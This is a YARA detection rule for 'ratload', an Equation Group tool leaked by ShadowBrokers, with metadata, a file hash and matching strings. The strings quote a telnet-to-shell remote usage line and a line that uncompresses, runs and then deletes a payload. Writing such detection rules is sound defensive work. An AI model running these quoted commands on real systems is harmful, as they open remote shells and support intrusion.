rule EquationGroup_ratload_RID2FAA : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/tmp/ratload.tmp.sh" fullword ascii
      $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
      $s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}